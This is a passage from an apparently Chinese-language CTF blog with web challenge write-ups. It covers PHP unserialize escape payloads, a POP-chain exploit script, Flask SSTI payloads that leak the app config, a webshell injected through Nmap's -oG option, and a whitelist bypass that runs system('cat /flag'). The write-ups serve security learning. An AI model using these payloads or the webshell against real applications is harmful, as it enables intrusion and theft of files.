class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开<code>phpinfo</code>界面发现<code>d0g3_f1ag.php</code>，思路就是利用判断<code>$function == &#39;show_image&#39;</code>处的代码，通过反序列化对<code>img</code>变脸进行赋值，然后进行文件读取</p><h3 id="键逃逸"><a href="#键逃逸" class="headerlink" title="键逃逸"></a>键逃逸</h3><p>需要一个键值对就行了，直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独的键值对</p><p>由于<code>flag</code>字符串会被过滤，故可以构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SESSION[&#x27;flagflag&#x27;] = &#x27;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>序列化后的字符串在过滤前后为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:8:&quot;flagflag&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line"></span><br><span class="line">a:4:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:8:&quot;&quot;;s:51:&quot;&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这样的话，经过过滤，会出现<code>&quot;;s:51:&quot;=&gt;aaa</code>键值对，进而达到了对<code>img</code>变量的覆盖。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：</span><br><span class="line">/index.php?f=show_image</span><br><span class="line">POST：</span><br><span class="line">_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>阅读源码发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获取<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：</span><br><span class="line">/index.php?f=show_image</span><br><span class="line">POST：</span><br><span class="line">_SESSION[flagflag]=&quot;;s:3:&quot;aaa&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="值逃逸"><a href="#值逃逸" class="headerlink" title="值逃逸"></a>值逃逸</h3><p>需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对</p><p>序列化后的字符串在过滤前后为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br><span class="line">a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最终<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：</span><br><span class="line">/index.php?f=show_image</span><br><span class="line">POST：</span><br><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><code>unicode</code>欺骗，使用<a href="https://www.compart.com/en/unicode/U+2188">ↈ</a>进行购买即可</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/charge</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>a6036e5c-010e-4543-97de-377a5e562999.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://a6036e5c-010e-4543-97de-377a5e562999.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://a6036e5c-010e-4543-97de-377a5e562999.node4.buuoj.cn:81/charge</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">id</span>=<span class="number">4</span>&amp;price=%E2%<span class="number">86</span>%<span class="number">88</span></span></span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>打开得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include &lt;- Modifier::__invoke &lt;- Test::__get &lt;- Show::__toString &lt;- Show::__construct</span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="comment">//include &lt;- Modifier::__invoke &lt;- Test::__get &lt;- Show::__toString &lt;- Show::__construct</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;source = <span class="variable">$obj</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>打开得源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><code>SSTI</code>模板注入</p><blockquote><p>url_for这个可以用来构造url，接受函数名作为第一个参数</p><p>get_flashed_message()是通过flash()传入闪现信息列表的，能够把字符串对象表示的信息加入到一个消息列表，然后通过调用get_flashed_message()来取出。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#payload-1</span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">#payload-2</span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><code>nmap</code>使用语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v 127.0.0.1 给出了远程机器更详细的信息，显示冗余信息(扫描细节)</span><br><span class="line">nmap -iL nmaptest.txt 运行带“iL” 选项的nmap命令来扫描文件中列出的所有IP地址</span><br><span class="line">nmap 192.168.0.* --exclude 192.168.0.100 使用“-exclude”选项来排除某些你不想要扫描的主机</span><br><span class="line">nmap -A 192.168.0.101 启用操作系统和版本检测，脚本扫描和路由跟踪功能</span><br><span class="line">nmap -O 127.0.0.1 使用选项“-O”和“-osscan-guess”也帮助探测操作系统信息</span><br><span class="line">nmap -sA 192.168.0.101 扫描远程主机以探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">nmap -PN 192.168.0.101 扫描主机检测其是否受到数据包过滤软件或防火墙的保护</span><br><span class="line">nmap -sP 192.168.0.* 找出网络中的在线主机</span><br><span class="line">nmap -F 192.168.0.101 快速扫描，仅扫描nmap-services文件中的端口而避开所有其它的端口</span><br><span class="line">nmap -f 192.168.96.4 使用小数据包发送，避免被识别出</span><br><span class="line">nmap -r 192.168.0.101 不会随机的选择端口扫描</span><br><span class="line">nmap -p 80,443 192.168.0.101 使用“-P”选项指定你想要扫描的端口</span><br><span class="line">nmap -sV 192.168.0.101 查找主机服务版本号</span><br><span class="line">nmap -PS 192.168.0.101 使用TCP ACK和TCP Syn方法来扫描远程主机（防火墙会阻断标ICMP包）</span><br><span class="line">nmap -Pn 192.168.96.4 目标机禁用ping，绕过ping扫描</span><br><span class="line">nmap -sn 192.168.96.4 对目标进行ping检测，不进行端口扫描（发送四种报文确定目标是否存活）</span><br><span class="line">nmap -sS 192.168.0.101 执行一次隐蔽的扫描，安全，快</span><br><span class="line">nmap -sT 192.168.0.101 使用TCP Syn扫描最常用的端口，不安全，慢</span><br><span class="line">nmap -sN 192.168.0.101 执行TCP空扫描以骗过防火墙</span><br><span class="line">nmap -sI 僵尸ip 目标ip 使用僵尸机对目标机发送数据包</span><br><span class="line">nmap 192.168.96.4 -oX myscan.xml 对扫描结果另存在myscan.xml</span><br><span class="line">nmap -T1~6 192.168.96.4 设置扫描速度，一般T4足够</span><br><span class="line">nmap –mtu 192.168.96.4 发送的包大小,最大传输单元必须是8的整数</span><br><span class="line">nmap -D &lt;假ip&gt; 192.168.96.4 发送参杂着假ip的数据包检测</span><br><span class="line">继续中断扫描：</span><br><span class="line">nmap –oG 1.txt –v 192.168.1.1/24 -oG将扫描结果保存为TXT，Ctrl+C中断扫描</span><br><span class="line">Nmap –resume 1.txt 作用：继续扫描</span><br><span class="line">参考：</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/pakho_c/article/details/126012963">[网鼎杯 2020 朱雀组]Nmap</a></p></blockquote><p>写入一句话木马即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?=@eval($_POST[a]);?&gt; -oG shell.phtml &#x27;</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>打开得到源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>利用白名单中的函数来构造出<code>$_GET[pi]</code>和<code>$_GET[abs]</code></p><p><code>exp.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dec_hex2bin</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;hex2bin&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);<span class="comment">//37907361743</span></span><br><span class="line"><span class="variable">$hex2bin</span> = <span class="title function_ invoke__">base_convert</span>(<span class="variable">$dec_hex2bin</span>,<span class="number">10</span>,<span class="number">36</span>);<span class="comment">//hex2bin</span></span><br><span class="line"><span class="variable">$dec_GET</span> = <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="number">16</span>,<span class="number">10</span>);<span class="comment">//1598506324</span></span><br><span class="line"><span class="comment">// $pi = $hex2bin(dechex($dec_GET));//_GET</span></span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$pi</span>;</span><br><span class="line"><span class="comment">//?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;pi&#125;)($$pi&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 